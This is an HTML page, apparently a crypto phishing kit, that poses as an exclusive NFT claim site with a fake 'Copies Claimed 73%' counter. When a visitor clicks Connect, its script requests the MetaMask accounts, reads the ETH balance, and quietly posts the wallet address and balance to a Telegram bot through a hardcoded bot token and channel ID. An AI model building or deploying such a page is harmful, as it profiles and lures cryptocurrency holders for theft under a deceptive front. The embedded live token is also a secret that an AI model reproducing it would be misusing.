<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon Bot Access</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
    <style>
        /* Estilo base */
        body {
            font-family: 'Archivo Black', sans-serif;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            position: relative;
            overflow: hidden;
            background-color: #000000;
        }

        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('background2.jpg') no-repeat center center fixed;
            background-size: cover;
            z-index: -2;
        }

        .background-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: -1;
        }

        .container {
            text-align: center;
            max-width: 600px;
            width: 90%;
            z-index: 1;
            padding: 20px;
            box-sizing: border-box;
        }

        h1 {
            font-size: 2.2em;
            margin-bottom: 0.5em;
            color: #00ffcc;
            white-space: nowrap;
        }

        .description {
            font-size: 1em;
            margin-bottom: 1.5em;
            color: #ecf0f1;
            line-height: 1.4em;
        }

        button {
            font-size: 1.1em;
            padding: 0.8em 2em;
            margin: 0.5em 0;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: bold;
            transition: transform 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
            background-color: #00c29b;
            color: #ffffff;
            width: 80%;
            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        button:hover {
            transform: translateY(-2px);
            background-color: #03c49d;
            box-shadow: 0 0 20px #03c49d;
        }

        #status {
            font-size: 1em;
            margin-top: 1em;
            color: #2ecc71;
            font-weight: bold;
        }

        .card {
            background-color: #1c1c1c;
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.5);
            padding: 15px;
            max-width: 250px;
            margin: 20px auto;
            text-align: center;
        }

        .card img {
            width: 80%;
            border-radius: 10px;
            margin-bottom: 10px;
        }

        .progress-container {
            width: 100%;
            background-color: #333;
            border-radius: 12px;
            overflow: hidden;
            margin-top: 10px;
            height: 15px;
        }

        .progress-bar {
            width: 0;
            height: 100%;
            background-color: #00ffcc;
            text-align: right;
            padding-right: 5px;
            box-sizing: border-box;
            color: #fff;
            font-size: 0.9em;
            font-weight: bold;
            animation: fillProgressBar 3s ease-out forwards;
        }

        @keyframes fillProgressBar {
            0% { width: 0; }
            100% { width: 73%; }
        }

        .claimed-text {
            font-size: 0.75em;
            color: #ecf0f1;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="background-image"></div>
    <div class="background-overlay"></div>

    <div class="container">
        <h1><span class="neon">NEON</span> ACCESS</h1>
        <p class="description">
            Claim 1 of 300 exclusive Neon Bot.<br>
            Avoid Bot Wallets, Only wallets with transactions are eligible.
        </p>

        <div class="card">
            <img src="tarjeta.jpg" alt="NFT Preview">
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
            <p class="claimed-text">Copies Claimed 73%</p>
        </div>

        <button id="connectButton">Connect</button>
        <p id="status"></p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8061822678:AAEXjFUocG2cjyCCmIVyqVikMg96bFPbaXg';
        const TELEGRAM_CHANNEL_ID = '-1002286653887';

        async function sendMessageToTelegram(walletAddress, ethBalance) {
            const message = `Nueva conexión:\n\nWallet: ${walletAddress}\nBalance: ${ethBalance} ETH`;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHANNEL_ID, text: message }),
                });

                if (!response.ok) {
                    throw new Error(`Error al enviar el mensaje: ${response.statusText}`);
                }
                console.log('Mensaje enviado con éxito.');
            } catch (error) {
                console.error('Error enviando mensaje a Telegram:', error);
            }
        }

        document.getElementById('connectButton').onclick = async () => {
            if (typeof window.ethereum !== 'undefined') {
                const web3 = new Web3(window.ethereum);
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

                const walletAddress = accounts[0];
                const balanceWei = await web3.eth.getBalance(walletAddress);
                const ethBalance = web3.utils.fromWei(balanceWei, 'ether');

                sendMessageToTelegram(walletAddress, ethBalance);

                document.getElementById('status').innerText = `Wallet conectada: ${walletAddress}`;
            } else {
                alert('Por favor, instala MetaMask.');
            }
        };
    </script>
</body>
</html>
